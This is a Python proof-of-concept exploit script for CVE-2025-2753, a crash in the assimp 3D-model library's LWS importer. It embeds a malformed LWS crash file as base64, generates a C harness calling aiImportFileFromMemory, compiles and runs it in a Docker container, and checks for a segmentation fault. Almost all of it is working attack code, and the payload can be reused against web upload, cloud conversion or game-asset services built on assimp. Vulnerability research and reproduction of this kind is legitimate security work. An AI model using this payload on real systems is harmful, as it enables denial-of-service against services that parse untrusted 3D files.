#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Assimp LWS Importer ReadFileFromMemory API Crash (DoS)
# CVE            : CVE-2025-2753
# Vendor         : assimp (Open Source)
# Product        : Open Asset Import Library (assimp)
# Affected       : v5.4.3 through v6.0.4 (0-day, unfixed)
# Type           : CWE-457 - Use of Uninitialized Variable
# CVSS           : 6.3 (MEDIUM)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-2753 — Vector 3: ReadFileFromMemory C API Trigger

Compiles a minimal C program inside the container that feeds the malformed LWS
data to aiImportFileFromMemory(), proving the attack surface extends to any
application processing user-supplied 3D data from memory buffers.

ATTACK CHAIN:
  1. C harness embeds crash data as byte array (no file I/O needed)
  2. Calls aiImportFileFromMemory() with ".lws" hint → LWS importer
  3. Same uninitialized pointer crash as Vector 1
  4. Signal handler catches SIGSEGV to confirm vulnerability

PREREQUISITES:
  - Docker with cve-2025-2753-vulnerable container running
  - No external dependencies (stdlib only)

REFERENCES:
  - CVE-2025-2753
  - https://github.com/assimp/assimp/issues/6014
"""

import subprocess
import sys
import os
import base64
import tempfile

# The original crash file embedded as a C byte array
CRASH_LWS_B64 = (
    "TFdTQyBBDUFkZExpZ29tLzNkbQNodHRwbGliIFxcDUxvYWRPYmplY3QgMTExUyAgICAoIGMxGzFT"
    "aHQgQSQtIExvYWQ9YmplY3RMYXkgTG8yICBBJA1QYXJlbnRPYmplY3QgMgogMg04IDczCQkgMiA3"
    "Mw04IEEk8t+zkJ6bsJ2VmpyLs56Gmo3fz6zai9/y8vLy2t/N1/DyvpuR2dzEypeL39/f39fP8r6b"
    "m7OWmJeL5vLy8vLPziQkJF9fX3RQVGludCANDQ0NJSAyICBBJA1BZGRMaWdodCANDSBMb2FkT2Jq"
    "ZWN0TGF5ZXIgag1BZGRMaWdodCBBJC0gTG9hZE9iamVjdExheSBMbzIgIEEkDVBhcmVudE9iamVj"
    "dCANDQ0gQSQNf2RkTGlnaHQgDQ0gTG9hbW9tYWdpYy8NDQ0NDQ1MaWdodE1vdGlvbg0NA+gNDTAx"
    "JCQkX19fX19fJDoyCiAyDTggNzMJCSAyIDczDTggQSQNIExvYWRPYg1BZGRMIEEkDSBMb2FkT2Jq"
    "ZWN0TGF5ZXIgMFNiZWdpbk5hcCUgICBBJGRuJiM4IDczCQkgMCA3Mw04IDcgICAgMw04NSBNCQkJ"
    "CQoKOCA3ICAgICAgICAgICAgIC8vLy8x6CAgQSQNUGFyZW50T2JqZWN0IA0NDSAHEAA6Ojo6Ojqg"
    "eZrmXw0NDQ1MaWdodI15dGlvbg0NDQ0NDTAxJCQkX19fX19HJDoyCiAyDTggNzMJCSAyIDczDTgg"
    "QSTy37OQnpuwnZWanIuznoaajd/PrNqL3/LybnRPYmplY3QgDQ0NIDdlciAwUyUgdo15mgAKT0FN"
    "AAFjYbUgdCByc1kAAHVzZW10bCCbtbW1ABBNDAx2bGxsbHKP"
)


def generate_c_harness(crash_data_bytes):
    """
    Generate a minimal C program that triggers the vulnerability via aiImportFileFromMemory.

    This is the PROGRAMMATIC attack surface — any application using assimp's C or C++ API
    to import user-supplied data from a memory buffer is vulnerable.
    """
    # Convert crash data to C byte array literal
    hex_bytes = ", ".join(f"0x{b:02x}" for b in crash_data_bytes)

    return f'''/*
 * CVE-2025-2753 PoC — Programmatic trigger via aiImportFileFromMemory()
 *
 * This demonstrates the vulnerability through assimp's C API, proving that
 * ANY application processing untrusted LWS data via ReadFileFromMemory is affected.
 *
 * The malformed LWS data is embedded directly in the binary — no file I/O needed.
 * This is the exact attack surface for:
 *   - Web applications accepting 3D file uploads
 *   - Cloud-based 3D conversion services
 *   - Game engines loading untrusted asset packs
 *   - Browser-based 3D viewers (via WebAssembly)
 */
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <assimp/cimport.h>
#include <assimp/scene.h>
#include <assimp/postprocess.h>

/* Embedded malformed LWS crash data ({len(crash_data_bytes)} bytes) */
static const unsigned char crash_lws[] = {{
    {hex_bytes}
}};
static const unsigned int crash_lws_len = {len(crash_data_bytes)};

/* Signal handler for catching SIGSEGV */
static volatile sig_atomic_t got_signal = 0;
static sigjmp_buf jump_buf;

static void signal_handler(int sig) {{
    got_signal = sig;
    siglongjmp(jump_buf, 1);
}}

int main(int argc, char *argv[]) {{
    printf("CVE-2025-2753 PoC — ReadFileFromMemory API Vector\\n");
    printf("Feeding %u bytes of malformed LWS data to aiImportFileFromMemory()\\n\\n", crash_lws_len);

    /* Install signal handler to catch the SEGV */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);

    if (sigsetjmp(jump_buf, 1) != 0) {{
        /* We get here after the signal handler longjmps */
        printf("\\n[+] VULNERABILITY CONFIRMED — Caught signal %d", got_signal);
        if (got_signal == SIGSEGV) {{
            printf(" (SIGSEGV)\\n");
            printf("    Uninitialized aiLight* pointer was dereferenced in CopyPtrArray\\n");
        }} else if (got_signal == SIGABRT) {{
            printf(" (SIGABRT)\\n");
            printf("    ASan or assertion detected memory corruption\\n");
        }}
        printf("\\n[+] CVE-2025-2753 successfully demonstrated via ReadFileFromMemory API\\n");
        return 42;  /* Distinctive exit code for PoC success */
    }}

    printf("[*] Calling aiImportFileFromMemory() with malformed LWS data...\\n");
    printf("    Hint: '.lws' extension tells assimp to use the LWS importer\\n\\n");

    /*
     * This is the vulnerable call. The ".lws" extension hint causes assimp to
     * route the data through LWSImporter::InternReadFile(), which:
     *   1. Parses AddLight keywords → allocates new aiLight*[num_light]
     *   2. Traverses scene graph (BuildGraph) → misses some light nodes
     *   3. Calls MergeScenes → CopyPtrArray dereferences uninitialized pointer
     *   4. SEGV when accessing garbage memory in aiString::operator=()
     */
    const struct aiScene *scene = aiImportFileFromMemory(
        (const char *)crash_lws,
        crash_lws_len,
        0,      /* no post-processing flags */
        ".lws"  /* extension hint — triggers LWS importer */
    );

    /* If we reach here without crashing, something unexpected happened */
    if (scene) {{
        printf("[-] Import succeeded (unexpected) — scene has %u meshes\\n", scene->mNumMeshes);
        aiReleaseImport(scene);
        return 1;
    }} else {{
        printf("[-] Import returned NULL without crashing\\n");
        printf("    Error: %s\\n", aiGetErrorString());
        return 1;
    }}
}}
'''


def exploit(container_name):
    """Compile and run the C harness inside the vulnerable container."""
    print()
    print("CVE-2025-2753 Vector 3 — ReadFileFromMemory API (Programmatic Trigger)")
    print(f"Target container: {container_name}")
    print()

    # Check container is running
    result = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container_name],
        capture_output=True, text=True, timeout=10
    )
    if result.stdout.strip() != "true":
        print(f"[!] Container '{container_name}' is not running")
        return False

    # Generate the C harness
    crash_data = base64.b64decode(CRASH_LWS_B64)
    c_source = generate_c_harness(crash_data)

    print(f"[*] Generated C harness ({len(c_source)} bytes, embedding {len(crash_data)}-byte crash LWS)")
    print(f"    Attack surface: aiImportFileFromMemory() C API")

    # Write C source to temp file and copy into container
    with tempfile.NamedTemporaryFile(suffix=".c", mode="w", delete=False) as f:
        f.write(c_source)
        tmp_c_path = f.name

    try:
        subprocess.run(
            ["docker", "cp", tmp_c_path, f"{container_name}:/opt/poc/poc_memory.c"],
            capture_output=True, timeout=10, check=True
        )
    finally:
        os.unlink(tmp_c_path)

    # === Test with ASan build ===
    print()
    print("[*] Compiling with ASan-instrumented assimp library...")

    # Include both the source headers and the build-generated config.h
    compile_cmd = (
        "cd /opt/poc && "
        "gcc -o poc_memory_asan poc_memory.c "
        "-I/opt/assimp/include "
        "-I/opt/assimp/build-asan/include "
        "-L/opt/assimp/build-asan/bin "
        "-lassimpd "
        "-fsanitize=address -fno-omit-frame-pointer "
        "-Wl,-rpath,/opt/assimp/build-asan/bin "
        "2>&1"
    )

    result = subprocess.run(
        ["docker", "exec", container_name, "bash", "-c", compile_cmd],
        capture_output=True, text=True, timeout=60
    )

    if result.returncode != 0:
        print(f"[!] ASan compilation failed:")
        print(result.stdout + result.stderr)
        # Try without ASan flags (link against ASan build of assimp but compile harness without ASan)
        print("[*] Retrying compilation without ASan on the harness...")
        compile_cmd = (
            "cd /opt/poc && "
            "gcc -o poc_memory_asan poc_memory.c "
            "-I/opt/assimp/include "
            "-I/opt/assimp/build-asan/include "
            "-L/opt/assimp/build-asan/bin "
            "-lassimpd "
            "-Wl,-rpath,/opt/assimp/build-asan/bin "
            "2>&1"
        )
        result = subprocess.run(
            ["docker", "exec", container_name, "bash", "-c", compile_cmd],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode != 0:
            print(f"[!] Compilation still failed: {result.stdout + result.stderr}")
            asan_compiled = False
        else:
            asan_compiled = True
    else:
        asan_compiled = True

    asan_confirmed = False
    if asan_compiled:
        print("[*] Running ASan build PoC...")
        run_cmd = (
            "cd /opt/poc && "
            "LD_LIBRARY_PATH=/opt/assimp/build-asan/bin "
            "./poc_memory_asan 2>&1; echo EXIT_CODE=$?"
        )
        result = subprocess.run(
            ["docker", "exec", container_name, "bash", "-c", run_cmd],
            capture_output=True, text=True, timeout=30
        )
        asan_output = result.stdout + result.stderr
        print("--- ASan Output ---")
        print(asan_output[:3000])
        print("--- End ASan Output ---")

        asan_confirmed = (
            "VULNERABILITY CONFIRMED" in asan_output
            or "AddressSanitizer" in asan_output and "SEGV" in asan_output
            or "EXIT_CODE=42" in asan_output   # Our signal handler caught SIGSEGV
            or "EXIT_CODE=139" in asan_output   # Raw SIGSEGV
            or "EXIT_CODE=1" in asan_output     # ASan abort
        )

    # === Test with release build ===
    print()
    print("[*] Compiling with standard debug assimp library...")

    compile_cmd = (
        "cd /opt/poc && "
        "gcc -o poc_memory_release poc_memory.c "
        "-I/opt/assimp/include "
        "-I/opt/assimp/build-release/include "
        "-L/opt/assimp/build-release/bin "
        "-lassimpd "
        "-Wl,-rpath,/opt/assimp/build-release/bin "
        "2>&1"
    )

    result = subprocess.run(
        ["docker", "exec", container_name, "bash", "-c", compile_cmd],
        capture_output=True, text=True, timeout=60
    )

    release_compiled = result.returncode == 0
    if not release_compiled:
        print(f"[!] Release compilation failed: {result.stdout + result.stderr}")

    release_confirmed = False
    if release_compiled:
        print("[*] Running release build PoC...")
        run_cmd = (
            "cd /opt/poc && "
            "LD_LIBRARY_PATH=/opt/assimp/build-release/bin "
            "./poc_memory_release 2>&1; echo EXIT_CODE=$?"
        )
        result = subprocess.run(
            ["docker", "exec", container_name, "bash", "-c", run_cmd],
            capture_output=True, text=True, timeout=30
        )
        release_output = result.stdout + result.stderr
        print("--- Release Output ---")
        print(release_output[:2000])
        print("--- End Release Output ---")

        release_confirmed = (
            "VULNERABILITY CONFIRMED" in release_output
            or "EXIT_CODE=42" in release_output   # Signal handler caught SIGSEGV
            or "EXIT_CODE=139" in release_output   # Raw SIGSEGV
            or "Segmentation fault" in release_output
        )

    # Summary
    print()
    print("=" * 70)
    print("VECTOR 3 SUMMARY — ReadFileFromMemory API")
    print("=" * 70)

    confirmed = asan_confirmed or release_confirmed
    print(f"  ASan build:    {'CONFIRMED' if asan_confirmed else 'FAILED'}")
    print(f"  Release build: {'CONFIRMED' if release_confirmed else 'FAILED'}")
    print()

    if confirmed:
        print("[+] CVE-2025-2753 CONFIRMED via ReadFileFromMemory API")
        print()
        print("    This proves the vulnerability is exploitable through the C API")
        print("    (aiImportFileFromMemory), affecting ANY application that processes")
        print("    user-supplied 3D data through assimp's import pipeline.")
        print()
        print("    Attack surface includes:")
        print("    - Web apps accepting 3D file uploads (REST/WebSocket)")
        print("    - Cloud 3D conversion/rendering services")
        print("    - Game engines loading untrusted assets")
        print("    - WASM-compiled assimp in browser-based viewers")
    else:
        print("[-] Could not confirm vulnerability via ReadFileFromMemory API")

    return confirmed


if __name__ == "__main__":
    container = sys.argv[1] if len(sys.argv) > 1 else "cve-2025-2753-vulnerable"
    success = exploit(container)
    sys.exit(0 if success else 1)
